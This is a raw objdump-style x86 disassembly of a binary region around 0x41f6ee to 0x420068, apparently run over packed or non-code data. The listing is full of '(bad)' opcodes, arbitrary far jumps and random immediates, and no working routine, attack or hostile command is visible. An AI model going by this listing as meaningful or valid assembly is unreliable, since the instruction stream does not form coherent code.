  41f6ee:	daa    
  41f6ef:	hlt    
  41f6f0:	ins    DWORD PTR es:[edi],dx
  41f6f1:	push   ss
  41f6f2:	push   edx
  41f6f3:	or     ebx,DWORD PTR [edi+0x42e97862]
  41f6f9:	jg     0x41f771
  41f6fb:	outs   dx,BYTE PTR ds:[esi]
  41f6fc:	push   ds
  41f6fd:	outs   dx,DWORD PTR ds:[esi]
  41f6fe:	pop    es
  41f6ff:	fdiv   DWORD PTR [edx+esi*4]
  41f702:	adc    eax,0xe48d37ac
  41f707:	retf   0xbd70
  41f70a:	popa   
  41f70b:	popf   
  41f70c:	or     ah,BYTE PTR [edi+0x49]
  41f70f:	sbb    eax,0xc6754648
  41f714:	mov    eax,ds:0x8e2a8d2f
  41f719:	sbb    al,0x35
  41f71b:	cmp    ah,al
  41f71d:	(bad)  
  41f71e:	and    ecx,DWORD PTR [eax+0x63ae17fb]
  41f724:	pusha  
  41f725:	out    dx,al
  41f726:	mov    bl,0x98
  41f728:	add    DWORD PTR [edx+esi*4+0x3876baf2],edx
  41f72f:	fmulp  st(0),st
  41f731:	cld    
  41f732:	cs neg cl
  41f735:	loopne 0x41f714
  41f737:	inc    esi
  41f738:	js     0x41f781
  41f73a:	xlat   BYTE PTR ds:[ebx]
  41f73b:	dec    eax
  41f73c:	adc    al,0xd2
  41f73e:	fdivr  QWORD PTR [ebp+0x54b1ed82]
  41f744:	nop
  41f745:	jle    0x41f6f8
  41f747:	xchg   BYTE PTR [edi+0x3e29157d],ch
  41f74d:	hlt    
  41f74e:	or     BYTE PTR [edx+ecx*1-0x1f],al
  41f752:	imul   eax,DWORD PTR [ecx],0x8c2766c
  41f758:	aaa    
  41f759:	(bad)  
  41f75a:	clc    
  41f75b:	dec    esi
  41f75c:	mov    al,0x2a
  41f75e:	arpl   WORD PTR [eax],si
  41f760:	jle    0x41f7d0
  41f762:	jmp    0x9112483e
  41f767:	jo     0x41f7c8
  41f769:	popf   
  41f76a:	inc    esi
  41f76b:	cmc    
  41f76c:	mov    ch,0x0
	...
  41f7d6:	xchg   edx,eax
  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xaf96:0xca6c62d2
  41f7e5:	xchg   esp,eax
  41f7e6:	in     al,dx
  41f7e7:	push   ecx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	inc    DWORD PTR [eax]
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	inc    ebp
  41f7ef:	jmp    0xb5c808a0
  41f7f4:	ret    0x2913
  41f7f7:	push   ecx
  41f7f8:	xor    al,0xe6
  41f7fa:	jno    0x41f7e7
  41f7fc:	sbb    ecx,DWORD PTR [edi+0x19fa24f9]
  41f802:	(bad)  
  41f804:	sar    DWORD PTR [edi],0x75
  41f807:	add    al,BYTE PTR [ebp+0x3c1cb14c]
  41f80d:	jno    0x41f7b7
  41f80f:	gs push cs
  41f811:	das    
  41f812:	push   eax
  41f813:	adc    eax,0x5355e323
  41f818:	mov    esp,DWORD PTR [ebp-0x3c]
  41f81b:	lock stos DWORD PTR es:[edi],eax
  41f81d:	cmp    BYTE PTR [eax+ebx*1+0x10],cl
  41f821:	adc    ecx,DWORD PTR [edx-0x4c]
  41f824:	pop    bp
  41f826:	pop    ebp
  41f827:	xchg   ecx,eax
  41f828:	cmp    al,0xda
  41f82a:	ss inc ecx
  41f82c:	in     al,0xb5
  41f82e:	clc    
  41f82f:	dec    ecx
  41f830:	inc    esp
  41f831:	pop    ebp
  41f832:	cli    
  41f833:	push   esp
  41f834:	pop    ecx
  41f835:	pushf  
  41f836:	out    dx,al
  41f837:	stc    
  41f838:	inc    esi
  41f839:	in     al,dx
  41f83a:	xchg   esi,eax
  41f83b:	push   es
  41f83c:	xchg   esi,eax
  41f83d:	jae    0x41f895
  41f83f:	fs call 0x9694:0x7f615943
  41f847:	imul   ebp,DWORD PTR [eax-0x36],0x8a53fbb2
  41f84e:	xchg   edx,eax
  41f84f:	push   ebp
  41f850:	mov    ch,0xb7
  41f852:	pop    ecx
  41f853:	jecxz  0x41f834
  41f855:	mov    fs:0xc7b5ff1e,al
  41f85b:	stc    
  41f85c:	jo     0x41f87d
  41f85e:	pop    ss
  41f85f:	xor    bh,dh
  41f861:	mov    DWORD PTR [esi-0x12],0x6ccfc6f6
  41f868:	ss add eax,0x82c09c29
  41f86e:	lods   al,BYTE PTR ds:[esi]
  41f86f:	sbb    bl,BYTE PTR [eax]
  41f871:	xchg   esp,eax
  41f872:	ins    DWORD PTR es:[edi],dx
  41f873:	mov    ebx,0x28e2df7c
  41f878:	pop    edx
  41f879:	out    0x94,eax
  41f87b:	test   dl,0xbf
  41f87e:	jecxz  0x41f8ae
  41f880:	in     al,0x13
  41f882:	add    DWORD PTR ds:0x6b03576,eax
  41f888:	es mov bh,0xf8
  41f88b:	jmp    0xca7b426b
  41f890:	push   DWORD PTR [ecx]
  41f892:	dec    esi
  41f893:	push   edi
  41f894:	dec    edi
  41f895:	pop    ecx
  41f896:	push   esp
  41f897:	ja     0x41f8a3
  41f899:	shr    BYTE PTR [ebx+edi*4],cl
  41f89c:	adc    cx,WORD PTR [edx+0x7f]
  41f8a0:	arpl   bp,di
  41f8a2:	jp     0x52ed5abf
  41f8a8:	loope  0x41f8f4
  41f8aa:	pop    edi
  41f8ab:	cmp    eax,esp
  41f8ad:	enter  0x9afd,0x72
  41f8b1:	scas   eax,DWORD PTR es:[edi]
  41f8b2:	cmc    
  41f8b3:	mul    ebp
  41f8b5:	ficomp DWORD PTR [eax-0x67]
  41f8b8:	inc    ebp
  41f8b9:	arpl   WORD PTR [edi-0x76],bp
  41f8bc:	cmp    BYTE PTR [ebp+0x708d5586],cl
  41f8c2:	jb     0x41f878
  41f8c4:	scas   eax,DWORD PTR es:[edi]
  41f8c5:	nop
  41f8c6:	in     eax,0x56
  41f8c8:	dec    esp
  41f8c9:	mov    BYTE PTR [ebx-0x5a],bl
  41f8cc:	adc    ebx,0x6a6cef2d
  41f8d2:	sbb    DWORD PTR [ebx-0x5ceb695f],ebx
  41f8d8:	or     BYTE PTR [ebx+0x75],al
  41f8db:	push   cs
  41f8dc:	cwde   
  41f8dd:	out    dx,eax
  41f8de:	sbb    DWORD PTR [esi-0x75],edi
  41f8e1:	scas   al,BYTE PTR es:[edi]
  41f8e2:	xchg   esi,eax
  41f8e3:	mov    ah,BYTE PTR [ebp-0x2ab75e9b]
  41f8e9:	fld    DWORD PTR [ecx]
  41f8eb:	xchg   edi,eax
  41f8ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41f955:	add    BYTE PTR [ecx+0x3b920b9a],ah
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	mov    ebx,0xebf0e927
  41f967:	push   edx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	inc    DWORD PTR [eax]
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	inc    esi
  41f96f:	test   al,0xc3
  41f971:	outs   dx,DWORD PTR ds:[esi]
  41f972:	dec    edx
  41f973:	data16 ds aad 0x6d
  41f977:	sub    edi,DWORD PTR [esi-0x2d]
  41f97a:	std    
  41f97b:	(bad)  
  41f97c:	cld    
  41f97d:	adc    BYTE PTR [esi*1+0x60b39d50],ah
  41f984:	repz and bl,BYTE PTR [edx+0x7d]
  41f988:	mov    dl,0x81
  41f98a:	stc    
  41f98b:	jmp    DWORD PTR [ebx+ebp*4]
  41f98e:	push   0xffffffa8
  41f990:	popa   
  41f991:	mov    cs,WORD PTR [ecx-0x74a59c12]
  41f997:	stos   BYTE PTR es:[edi],al
  41f998:	fucomip st,st(2)
  41f99a:	add    esp,DWORD PTR [esi-0x1a55ff37]
  41f9a0:	nop
  41f9a1:	mov    ecx,DWORD PTR [eax-0x752aa0b3]
  41f9a7:	lock retf 
  41f9a9:	lods   eax,DWORD PTR ds:[esi]
  41f9aa:	push   0x4c
  41f9ac:	fsub   QWORD PTR [ebp+0x53cb3d57]
  41f9b2:	jae    0x41f9b9
  41f9b4:	jno    0x41fa2e
  41f9b6:	xor    dh,bh
  41f9b8:	shl    ebx,1
  41f9ba:	mov    ds:0x34f1701d,eax
  41f9bf:	repnz shrd DWORD PTR [esi+ebp*8],esi,cl
  41f9c4:	mov    esp,esi
  41f9c6:	jbe    0x41fa09
  41f9c8:	ins    BYTE PTR es:[edi],dx
  41f9c9:	popf   
  41f9ca:	rcl    al,cl
  41f9cc:	inc    ecx
  41f9cd:	mov    ch,0x1a
  41f9cf:	ds pushf 
  41f9d1:	mov    eax,0xb8809c2d
  41f9d6:	loope  0x41fa45
  41f9d8:	out    dx,al
  41f9d9:	or     ecx,DWORD PTR [edi]
  41f9db:	and    DWORD PTR [edi+ebp*1-0x67409953],edi
  41f9e2:	adc    bh,BYTE PTR [ebx-0x385ebe3c]
  41f9e8:	int3   
  41f9e9:	icebp  
  41f9ea:	imul   esp,esi,0xffffffe2
  41f9ed:	test   BYTE PTR [edx],al
  41f9ef:	(bad)  
  41f9f0:	repnz std 
  41f9f2:	sbb    esp,esi
  41f9f4:	es xchg esp,eax
  41f9f6:	pop    ebp
  41f9f7:	scas   al,BYTE PTR es:[edi]
  41f9f8:	xchg   BYTE PTR [edi+esi*4+0x18],al
  41f9fc:	pusha  
  41f9fd:	pop    ds
  41f9fe:	pop    es
  41f9ff:	xchg   ecx,eax
  41fa00:	add    edx,DWORD PTR [edi]
  41fa02:	and    esp,DWORD PTR [ebx-0x4b9ac98]
  41fa08:	in     al,0xb2
  41fa0a:	ret    
  41fa0b:	mov    ecx,ebx
  41fa0d:	and    al,0xf4
  41fa0f:	and    edi,esp
  41fa11:	(bad)  
  41fa12:	dec    ebx
  41fa13:	call   0xfc761bce
  41fa18:	mov    bh,0xcb
  41fa1a:	fsubr  DWORD PTR [edx+eax*2-0x21]
  41fa1e:	inc    eax
  41fa1f:	xor    al,0x6a
  41fa21:	sbb    al,0xdb
  41fa23:	mov    edi,0x2d59fca7
  41fa28:	outs   dx,BYTE PTR ds:[esi]
  41fa29:	and    esp,DWORD PTR [edx-0x71d98dbf]
  41fa2f:	mov    ebp,0x8aed5e98
  41fa34:	adc    eax,0x651837b4
  41fa39:	xchg   ebx,eax
  41fa3a:	jle    0x41fa74
  41fa3c:	ud2    
  41fa3e:	mov    bh,0x5a
  41fa40:	sbb    eax,0x2503e6dd
  41fa45:	shl    DWORD PTR [esi+ebx*4-0x3b],cl
  41fa49:	cwde   
  41fa4a:	jg     0x41f9fa
  41fa4c:	js     0x41fa60
  41fa4e:	lea    ebp,[eax-0x6830eb72]
  41fa54:	iret   
  41fa55:	push   esi
  41fa56:	popf   
  41fa57:	dec    esi
  41fa58:	xchg   edx,eax
  41fa59:	ror    DWORD PTR [edi-0x5],0x96
  41fa5d:	sahf   
  41fa5e:	jae    0x41fa10
  41fa60:	cwde   
  41fa61:	in     al,0x7e
  41fa63:	pushf  
  41fa64:	fs jbe 0x41f9fd
  41fa67:	out    0x9e,eax
  41fa69:	cld    
  41fa6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa6b:	je     0x41fa9b
	...
  41fad5:	add    BYTE PTR [edx],cl
  41fad7:	inc    ecx
  41fad8:	mov    bh,0xa1
  41fada:	push   edi
  41fadc:	push   ds
  41fadd:	jmp    0x41fb02
  41fadf:	push   edi
  41fae0:	mov    ds:0x4c016515,eax
  41fae5:	js     0x41fad1
  41fae7:	push   ebx
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	inc    DWORD PTR [eax]
  41faec:	add    BYTE PTR [eax],al
  41faee:	and    esp,DWORD PTR [edi-0x40]
  41faf1:	cld    
  41faf2:	in     al,dx
  41faf3:	lahf   
  41faf4:	popf   
  41faf5:	dec    ecx
  41faf6:	push   ds
  41faf7:	xor    dl,al
  41faf9:	xor    eax,0x4fceae7c
  41fafe:	push   es
  41faff:	rol    ebx,cl
  41fb01:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41fb03:	aam    0xde
  41fb05:	mov    edx,0xb036648d
  41fb0a:	inc    esi
  41fb0b:	and    BYTE PTR [edi-0x51],0x52
  41fb0f:	(bad)
  41fb12:	push   esp
  41fb13:	imul   edx,DWORD PTR [esi+0x6],0x2
  41fb17:	in     eax,dx
  41fb18:	xlat   BYTE PTR ds:[ebx]
  41fb19:	jne    0x41fae9
  41fb1b:	sub    ch,BYTE PTR [ecx]
  41fb1d:	add    esp,DWORD PTR ds:0x99a565a1
  41fb23:	or     BYTE PTR [eax],dh
  41fb25:	ins    BYTE PTR es:[edi],dx
  41fb26:	inc    ebx
  41fb27:	in     al,dx
  41fb28:	cmp    al,0x8
  41fb2a:	push   0x49
  41fb2c:	mov    ecx,0x6e219e48
  41fb31:	arpl   WORD PTR [edi],ax
  41fb33:	mov    bh,0xb4
  41fb35:	ds test al,ah
  41fb38:	ja     0x41fb7c
  41fb3a:	repnz dec eax
  41fb3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fb3d:	dec    ebp
  41fb3e:	xchg   DWORD PTR [ecx+0x79],esp
  41fb41:	xor    DWORD PTR [esp+eax*8+0x8bd0dcf],ebp
  41fb48:	jg     0x41fb8d
  41fb4a:	push   esp
  41fb4b:	cdq    
  41fb4c:	mov    eax,ds:0x510ba81
  41fb51:	push   ecx
  41fb52:	push   edx
  41fb53:	imul   esi,DWORD PTR [ebp-0x3c6362b4],0x66428354
  41fb5d:	mov    al,ds:0x6b3b39d8
  41fb62:	pop    esp
  41fb63:	lods   al,BYTE PTR ds:[esi]
  41fb64:	add    ah,BYTE PTR ds:0xecb3ce20
  41fb6a:	mov    ds:0x584f45e,al
  41fb6f:	pop    es
  41fb70:	ret    
  41fb71:	add    al,0xc5
  41fb73:	call   0x908a9d33
  41fb78:	mov    bh,0x28
  41fb7a:	daa    
  41fb7b:	repnz lods eax,DWORD PTR ds:[esi]
  41fb7d:	sar    DWORD PTR [ebx],1
  41fb7f:	cmp    ch,dl
  41fb81:	(bad)  
  41fb82:	mov    bh,0xf8
  41fb84:	mov    edx,0x60b5454c
  41fb89:	lds    ecx,FWORD PTR [ecx+0x6c]
  41fb8c:	mov    ebp,0x8eb39488
  41fb91:	clc    
  41fb92:	lea    eax,[eax+0x1a]
  41fb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb96:	shr    DWORD PTR [edx],0x43
  41fb99:	fisubr WORD PTR [esi-0x63105056]
  41fb9f:	sti    
  41fba0:	pop    ss
  41fba1:	scas   al,BYTE PTR es:[edi]
  41fba2:	js     0x41fc1c
  41fba4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fba5:	push   ds
  41fba6:	stos   DWORD PTR es:[edi],eax
  41fba7:	enter  0x3766,0x15
  41fbab:	js     0x41fbe0
  41fbad:	rcr    BYTE PTR [esi],1
  41fbaf:	mov    ecx,0x4f9a7f20
  41fbb4:	push   eax
  41fbb5:	stos   BYTE PTR es:[edi],al
  41fbb6:	jae    0x41fc03
  41fbb8:	jnp    0x41fc35
  41fbba:	cld    
  41fbbb:	imul   edi,DWORD PTR [ecx+0x76],0x579c6c89
  41fbc2:	sub    al,al
  41fbc4:	xchg   ecx,eax
  41fbc5:	(bad)  
  41fbc7:	stos   BYTE PTR es:[edi],al
  41fbc8:	jg     0x41fbef
  41fbca:	lds    edx,FWORD PTR [esi]
  41fbcc:	aam    0x73
  41fbce:	sbb    BYTE PTR [esi+0x6f094962],dl
  41fbd4:	push   edx
  41fbd5:	or     eax,0x78dfcec0
  41fbda:	mul    DWORD PTR [esi]
  41fbdc:	scas   eax,DWORD PTR es:[edi]
  41fbdd:	sbb    esp,edi
  41fbdf:	int    0x55
  41fbe1:	rcr    esi,1
  41fbe3:	jle    0x41fbaf
  41fbe5:	mov    esp,ecx
  41fbe7:	mov    ecx,edi
  41fbe9:	push   edi
  41fbea:	imul   eax,DWORD PTR [edi],0xb5
	...
  41fc54:	add    BYTE PTR [eax],al
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	jl     0x41fc3b
  41fc64:	imul   edi,esp,0xffffffe9
  41fc67:	push   esp
  41fc68:	add    DWORD PTR [eax],eax
  41fc6a:	inc    DWORD PTR [eax]
  41fc6c:	add    BYTE PTR [eax],al
  41fc6e:	in     al,0xdd
  41fc70:	cli    
  41fc71:	dec    ebx
  41fc72:	mov    edx,DWORD PTR [ebx-0x2e]
  41fc75:	cwde   
  41fc76:	jnp    0x41fc48
  41fc78:	pop    ss
  41fc79:	xchg   esp,eax
  41fc7a:	out    dx,eax
  41fc7b:	xor    al,0xc1
  41fc7d:	ds aad 0x9c
  41fc80:	mov    dh,0x97
  41fc82:	sahf   
  41fc83:	retf   
  41fc84:	and    cl,BYTE PTR [ecx]
  41fc86:	lock clc 
  41fc88:	shl    al,1
  41fc8a:	fdiv   DWORD PTR [ebx-0x570b6b13]
  41fc90:	pusha  
  41fc91:	fcmovb st,st(4)
  41fc93:	test   esi,edx
  41fc95:	dec    esi
  41fc96:	xlat   BYTE PTR ds:[ebx]
  41fc97:	int3   
  41fc98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc99:	out    dx,eax
  41fc9a:	adc    eax,0x1e639ee4
  41fc9f:	iret   
  41fca0:	mov    esi,0x1446942b
  41fca5:	sbb    eax,0x63a3bad5
  41fcaa:	pop    ebx
  41fcab:	xlat   BYTE PTR ds:[ebx]
  41fcac:	mov    esp,DWORD PTR [edi-0x182ad0e6]
  41fcb2:	call   0x1fbc061d
  41fcb7:	jns    0x41fd31
  41fcb9:	dec    eax
  41fcba:	fbld   TBYTE PTR [ebp+0x44]
  41fcbd:	jg     0x41fd19
  41fcbf:	enter  0x6c71,0x6b
  41fcc3:	ss aam 0x7e
  41fcc6:	addr16 loopne 0x41fd0d
  41fcc9:	(bad)  
  41fccb:	and    al,BYTE PTR [ebx-0x5]
  41fcce:	ret    0x38b9
  41fcd1:	dec    ebx
  41fcd2:	fwait
  41fcd3:	sti    
  41fcd4:	ja     0x41fd23
  41fcd6:	sub    edi,DWORD PTR [edi-0x37]
  41fcd9:	jns    0x41fcde
  41fcdb:	outs   dx,DWORD PTR ds:[esi]
  41fcdc:	xchg   edi,eax
  41fcdd:	jp     0x41fc79
  41fcdf:	mov    dl,0x89
  41fce1:	sub    al,0xfe
  41fce3:	pop    ecx
  41fce4:	ds js  0x41fca4
  41fce7:	mov    dh,0xdd
  41fce9:	inc    ecx
  41fcea:	pop    es
  41fceb:	xor    DWORD PTR [edi+0x42],esi
  41fcee:	rcr    BYTE PTR [ecx],1
  41fcf0:	adc    ebx,DWORD PTR [edx+0x54de6742]
  41fcf6:	and    DWORD PTR [esi+0x41],eax
  41fcf9:	pushf  
  41fcfa:	jmp    0xd88ef537
  41fcff:	out    dx,eax
  41fd00:	retf   0x8f3d
  41fd03:	ret    0xed0c
  41fd06:	mov    bh,0xcf
  41fd08:	sub    eax,0x32632362
  41fd0d:	mov    gs,WORD PTR [ebp+0x12]
  41fd10:	loope  0x41fce6
  41fd12:	rcr    ch,cl
  41fd14:	aaa    
  41fd15:	or     BYTE PTR [ebp+0xa60c158],bl
  41fd1b:	adc    eax,0xc0655747
  41fd20:	mov    DWORD PTR [edx-0x1c],esp
  41fd23:	mov    ch,0xfe
  41fd25:	jmp    0xe3e3:0x1d1af7d7
  41fd2c:	clc    
  41fd2d:	ret    0xb48a
  41fd30:	mov    edi,0x171dcc92
  41fd35:	cmp    bl,BYTE PTR [esi+edi*2+0x52ebcbd0]
  41fd3c:	pop    edi
  41fd3d:	(bad)  
  41fd3e:	or     DWORD PTR [edi-0x53],0xb67f3fb3
  41fd45:	pop    edi
  41fd46:	cld    
  41fd47:	pop    esi
  41fd48:	and    bl,BYTE PTR [edi+eax*1-0x66]
  41fd4c:	cmp    cl,BYTE PTR [ebx]
  41fd4e:	xor    bl,cl
  41fd50:	mov    eax,ds:0xf8e5e2a7
  41fd55:	dec    edi
  41fd56:	jnp    0x41fd90
  41fd58:	retf   0xaa51
  41fd5b:	pop    ecx
  41fd5c:	xlat   BYTE PTR cs:[ebx]
  41fd5e:	xor    al,0x3c
  41fd60:	aaa    
  41fd61:	mov    edi,DWORD PTR [edi+0x72]
  41fd64:	xchg   DWORD PTR [ebp-0x9],edx
  41fd67:	pop    edi
  41fd68:	imul   edi,DWORD PTR [ecx],0x9
  41fd6b:	lods   eax,DWORD PTR ds:[esi]
  41fd6c:	mov    eax,0x0
	...
  41fdd5:	add    BYTE PTR [edx+ebp*2],cl
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	and    DWORD PTR [edx],ebp
  41fde4:	loopne 0x41fe52
  41fde6:	call   0xff41ff40
  41fdeb:	add    BYTE PTR [eax],al
  41fded:	add    BYTE PTR [eax-0x6b],bl
  41fdf0:	jp     0x41fdb8
  41fdf2:	es mov dh,0x50
  41fdf5:	jp     0x41fdbc
  41fdf7:	int    0xe0
  41fdf9:	cmp    cl,dh
  41fdfb:	(bad)  
  41fdfc:	xlat   BYTE PTR ds:[ebx]
  41fdfd:	sbb    BYTE PTR [edi+eiz*2+0x4],0x53
  41fe02:	push   cs
  41fe03:	xor    BYTE PTR [esi+0x6a8aaaf1],dl
  41fe09:	out    0xf5,eax
  41fe0b:	retf   0xfb8
  41fe0e:	stc    
  41fe0f:	adc    al,0x5f
  41fe11:	and    eax,0x78b5d6f9
  41fe16:	fiadd  WORD PTR [ecx-0x78]
  41fe19:	lods   al,BYTE PTR ds:[esi]
  41fe1a:	call   0x70f8:0x74fa31a
  41fe21:	jns    0x41fe72
  41fe23:	(bad)  
  41fe24:	jmp    0xdd94:0x7f01a993
  41fe2b:	dec    eax
  41fe2c:	lods   al,BYTE PTR ds:[esi]
  41fe2d:	test   eax,0x14381d1
  41fe32:	dec    ebp
  41fe33:	jp     0x41fe03
  41fe35:	sbb    DWORD PTR [esi-0x64],edx
  41fe38:	inc    edi
  41fe39:	push   esi
  41fe3a:	test   BYTE PTR [edx],al
  41fe3c:	pushf  
  41fe3d:	mul    BYTE PTR [eax+0x5f]
  41fe40:	data16 test al,0x20
  41fe43:	pusha  
  41fe44:	test   eax,0x739adb73
  41fe49:	xor    BYTE PTR [esp+edx*1],0x62
  41fe4d:	or     al,0x26
  41fe4f:	jne    0x41fe2c
  41fe51:	and    DWORD PTR ds:0xef3e6e2d,edi
  41fe57:	loopne 0x41fe43
  41fe59:	cli    
  41fe5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe5b:	jns    0x41fe58
  41fe5d:	dec    eax
  41fe5e:	shl    ecx,cl
  41fe60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fe61:	push   esi
  41fe62:	fcmovb st,st(3)
  41fe64:	shl    DWORD PTR [ebx+0x3a856eb3],cl
  41fe6a:	jecxz  0x41feb1
  41fe6c:	sbb    eax,0x1f112aee
  41fe71:	test   BYTE PTR [ebx-0x1f61885b],al
  41fe77:	je     0x41fe04
  41fe79:	jle    0x41fe88
  41fe7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe7c:	jl     0x41fe2a
  41fe7e:	stos   BYTE PTR es:[edi],al
  41fe7f:	dec    edi
  41fe80:	test   BYTE PTR [esi-0x587a5292],dl
  41fe86:	mov    dh,dl
  41fe88:	cli    
  41fe89:	scas   eax,DWORD PTR es:[edi]
  41fe8a:	test   DWORD PTR [ecx+0xdf7a329],0xb79acf51
  41fe94:	inc    edx
  41fe95:	xor    al,BYTE PTR [eax]
  41fe97:	mov    ds:0x5d67b08b,al
  41fe9c:	dec    ebp
  41fe9d:	adc    edx,esi
  41fe9f:	sub    al,0x21
  41fea1:	add    BYTE PTR [ecx],ch
  41fea3:	jg     0x41fe9b
  41fea5:	add    al,0xb8
  41fea7:	adc    edi,eax
  41fea9:	xor    ebp,esp
  41feab:	int    0x39
  41fead:	mov    ch,0x37
  41feaf:	jae    0x41ff09
  41feb1:	push   ecx
  41feb2:	jge    0x41fe71
  41feb4:	pop    es
  41feb5:	daa    
  41feb6:	es cld 
  41feb8:	add    DWORD PTR [edi+ebx*2+0x33e33fe4],esp
  41febf:	or     eax,DWORD PTR [eax+eax*4+0x3e0d7f70]
  41fec6:	adc    eax,0x148867d6
  41fecb:	cld    
  41fecc:	aas    
  41fecd:	cwde   
  41fece:	(bad)  
  41fecf:	fisttp DWORD PTR ds:0x7ac0a896
  41fed5:	mov    al,0xe8
  41fed7:	enter  0xb047,0x67
  41fedb:	push   ds
  41fedc:	fwait
  41fedd:	shr    dh,0x1d
  41fee0:	aad    0x52
  41fee2:	(bad)  
  41fee3:	jmp    0x186a1717
  41fee8:	push   ds
  41fee9:	dec    esi
  41feea:	ret    
  41feeb:	sub    eax,0x98
	...
  41ff54:	add    BYTE PTR [eax],al
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x27
  41ff63:	push   ebp
  41ff64:	xlat   BYTE PTR ds:[ebx]
  41ff65:	push   esi
  41ff66:	out    0x56,eax
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	inc    DWORD PTR [eax]
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	cmp    eax,0x5d7cbe11
  41ff73:	add    DWORD PTR [edx],edx
  41ff75:	mov    esp,esi
  41ff77:	push   eax
  41ff78:	xlat   BYTE PTR ds:[ebx]
  41ff79:	mov    ds:0xdb703930,eax
  41ff7e:	jo     0x41ffcf
  41ff80:	jae    0x41ffa1
  41ff82:	test   dl,ch
  41ff84:	retf   0x5c75
  41ff87:	adc    al,0xc7
  41ff89:	pop    ss
  41ff8a:	fdivrp st(1),st
  41ff8c:	sahf   
  41ff8d:	push   edx
  41ff8e:	pop    ds
  41ff8f:	pop    ebp
  41ff90:	mov    ch,0x58
  41ff92:	mov    ch,dh
  41ff94:	push   esp
  41ff95:	or     ah,BYTE PTR [esi]
  41ff97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff98:	(bad)
  41ff9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ff9d:	mov    al,ds:0x3e0905f3
  41ffa2:	xchg   edi,eax
  41ffa3:	fidivr WORD PTR [ebp+0x5a]
  41ffa6:	cmp    DWORD PTR [edx+0x632c6f49],ebx
  41ffac:	xor    eax,0x182c7501
  41ffb1:	repnz fwait
  41ffb3:	mov    ds:0x5a347753,al
  41ffb8:	int    0x39
  41ffba:	add    ecx,esp
  41ffbc:	das    
  41ffbd:	out    0x2c,eax
  41ffbf:	iret   
  41ffc0:	sub    eax,0xd80396ec
  41ffc5:	in     eax,dx
  41ffc6:	push   ebp
  41ffc7:	add    bh,BYTE PTR [esi]
  41ffc9:	jb     0x41fff6
  41ffcb:	dec    eax
  41ffcc:	loope  0x41ffaa
  41ffce:	popa   
  41ffcf:	jmp    0x41ff5d
  41ffd1:	xchg   esi,eax
  41ffd2:	fdiv   DWORD PTR [ebx-0x33e124c2]
  41ffd8:	sbb    DWORD PTR [edi+0x4e],0x55d42a17
  41ffdf:	xchg   esi,eax
  41ffe0:	jae    0x42000e
  41ffe2:	pusha  
  41ffe3:	add    al,0x11
  41ffe5:	je     0x41ffaa
  41ffe7:	jmp    0x41ffe3
  41ffe9:	ds inc esp
  41ffeb:	mov    ecx,0x9dba21ea
  41fff0:	cli    
  41fff1:	rol    cl,0x67
  41fff4:	mov    cl,0xe4
  41fff6:	xchg   esi,eax
  41fff7:	or     ah,BYTE PTR [ebx+0x45937df8]
  41fffd:	cmc    
  41fffe:	cmp    al,0x3e
  420000:	mov    ah,0xd
  420002:	dec    edi
  420003:	retf   0x2cc3
  420006:	shl    DWORD PTR [edi+0x1f],0x36
  42000a:	imul   ebp,DWORD PTR [ebp-0x1ff4a45c],0x256f1f83
  420014:	push   esp
  420015:	adc    eax,0x13fbbca3
  42001a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42001b:	das    
  42001c:	push   es
  42001d:	mov    ebx,0xe0869294
  420022:	pusha  
  420023:	lods   al,BYTE PTR ds:[esi]
  420024:	repnz pop edx
  420026:	pop    eax
  420027:	pop    esp
  420028:	shl    al,0x30
  42002b:	cs fdivrp st(7),st
  42002e:	push   esi
  42002f:	test   DWORD PTR [ebp-0x6615d97d],ebp
  420035:	xor    cl,al
  420037:	mov    ds:0x68185949,eax
  42003c:	dec    ecx
  42003d:	das    
  42003e:	test   BYTE PTR [esi-0x2b30c584],bh
  420044:	and    eax,DWORD PTR [ebx+0x3cb5a91d]
  42004a:	adc    BYTE PTR [ecx+0x50],dh
  42004d:	hlt    
  42004e:	stos   BYTE PTR es:[edi],al
  42004f:	popa   
  420050:	stc    
  420051:	clc    
  420052:	sbb    al,0xd7
  420054:	(bad)  
  420055:	out    dx,al
  420056:	imul   ecx,DWORD PTR [esi+0x16ccfed9],0xffffffdb
  42005d:	sub    ebx,eax
  42005f:	push   eax
  420060:	add    DWORD PTR [eax+0x68],ecx
  420063:	inc    esp
  420064:	pop    ecx
  420065:	popa   
  420066:	or     ebx,esi
  420068:	rol    DWORD PTR [ecx+0xef73ce],cl
	...
